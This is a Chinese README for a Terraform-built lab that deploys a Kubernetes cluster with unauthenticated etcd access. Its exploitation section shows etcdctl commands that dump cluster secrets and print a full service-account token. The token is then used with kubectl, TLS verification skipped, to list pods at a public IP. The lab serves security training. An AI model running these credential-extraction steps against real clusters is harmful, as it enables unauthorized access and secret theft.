# kubernetes etcd 漏洞环境

[English](./README.md) | 中文

## 描述信息

这是一个用于构建kubernetes etcd组件 未授权访问漏洞环境的靶场。

使用 terraform 构建环境后，用户可以通过 etcd组件 未授权访问漏洞获取到 kubernetes中的api资源信息。

## 环境搭建

在容器中执行以下命令

```shell
cd /TerraformGoat/kubernetes/etcd/unauth
```

配置阿里云访问凭证

```shell
export ALICLOUD_ACCESS_KEY="LTAI5tFkmNGXXXXXXXXX"
export ALICLOUD_SECRET_KEY="ORBs2lulAHDXXXXXXXXX"
export ALICLOUD_REGION="cn-beijing"
```

> 在阿里云控制台的 [AccessKey 页面](https://ram.console.aliyun.com/manage/ak) 可以创建和查看您的 AccessKey

部署靶场

```shell
terraform init
terraform apply
```

> 在终端提示 `Enter a value:` 时，输入 `yes` 即可

![img](../../../images/20220622-174141.jpg)

环境搭建完后，在 Outputs 处可以看到etcd的访问地址。

## 漏洞利用

在存在 未授权访问 漏洞的 etcd 上，我们可以利用 etcdctl工具 读取 kubernetes集群 的secrets数据。

读取secrets数据,获取部署控制器token

```shell
➜  unauth git:(main) ✗ etcdctl --endpoints="http://39.96.163.182:2379" get / --prefix --keys-only|grep secrets
...
/registry/secrets/kube-system/deployment-controller-token-klbtj
...
➜  unauth git:(main) ✗ etcdctl --endpoints="http://39.96.163.182:2379" get /registry/secrets/kube-system/deployment-controller-token-klbtj
...
token�eyJhbGciOiJSUzI1NiIsImtpZCI6Im93R3VfUk1vcHRpakg3T2xZVkNuODVIYTg3eXlzYWprYU1ub2hWSUhSNXcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZXBsb3ltZW50LWNvbnRyb2xsZXItdG9rZW4ta2xidGoiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVwbG95bWVudC1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMDEyM2U0M2YtYWY4NS00NTAxLWIyZDItNDUxNjc1ZWEzMTcyIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRlcGxveW1lbnQtY29udHJvbGxlciJ9.oUUcnRPq1Rc3HttQsS3HBarzmAfIZk4YrmmJ0ARjYG2LwIp_hQbVQBZ0crKdsL10nXjV9MmLIPB9jFxVmUHhifc054cQ5H0e5yKQv7rlQxbNSIZo2s9nYgMql5DrEaQ9aocyzGlZVG8Z5aWFHEjduPCQKeCvBoQfuTyBrqBAqZP-zWYYIFLrYxKOyFICqDTNe0GKA3MxXeMrpp2S1ijg29WflZ_fTXJbY6iVISnT9oUFuw6uoIatYvNZXIsCfXqwAN4TPmEX4_joezLCKQH9iUCGutHpiyTXJpd3Ry8x66ziVu9JFzoOjpHJCyOmo-hT-eV5TD6UBxeg9UEQzZqwTA#kubernetes.io/service-account-token
```

利用token访问访问kube-apiserver，比如查询pod

```shell
➜  unauth git:(main) ✗  kubectl --insecure-skip-tls-verify=true --server="https://39.96.163.182:6443" --token="eyJhbGciOiJSUzI1NiIsImtpZCI6Im93R3VfUk1vcHRpakg3T2xZVkNuODVIYTg3eXlzYWprYU1ub2hWSUhSNXcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZXBsb3ltZW50LWNvbnRyb2xsZXItdG9rZW4ta2xidGoiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVwbG95bWVudC1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMDEyM2U0M2YtYWY4NS00NTAxLWIyZDItNDUxNjc1ZWEzMTcyIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRlcGxveW1lbnQtY29udHJvbGxlciJ9.oUUcnRPq1Rc3HttQsS3HBarzmAfIZk4YrmmJ0ARjYG2LwIp_hQbVQBZ0crKdsL10nXjV9MmLIPB9jFxVmUHhifc054cQ5H0e5yKQv7rlQxbNSIZo2s9nYgMql5DrEaQ9aocyzGlZVG8Z5aWFHEjduPCQKeCvBoQfuTyBrqBAqZP-zWYYIFLrYxKOyFICqDTNe0
GKA3MxXeMrpp2S1ijg29WflZ_fTXJbY6iVISnT9oUFuw6uoIatYvNZXIsCfXqwAN4TPmEX4_joezLCKQH9iUCGutHpiyTXJpd3Ry8x66ziVu9JFzoOjpHJCyOmo-hT-eV5TD6UBxeg9UEQzZqwTA" get pods -A

NAMESPACE     NAME                                              READY   STATUS    RESTARTS   AGE
kube-system   coredns-5495dd7c88-kb7vh                          0/1     Pending   0          18m
kube-system   coredns-5495dd7c88-lwkpr                          0/1     Pending   0          18m
kube-system   kube-apiserver-iz2zeh6di9zn4ff2qvgh8jz            1/1     Running   0          17m
kube-system   kube-controller-manager-iz2zeh6di9zn4ff2qvgh8jz   1/1     Running   1          19m
kube-system   kube-proxy-pgrtj                                  1/1     Running   0          18m
kube-system   kube-scheduler-iz2zeh6di9zn4ff2qvgh8jz            1/1     Running   1          19m
```

## 销毁环境

```shell
terraform destroy
```
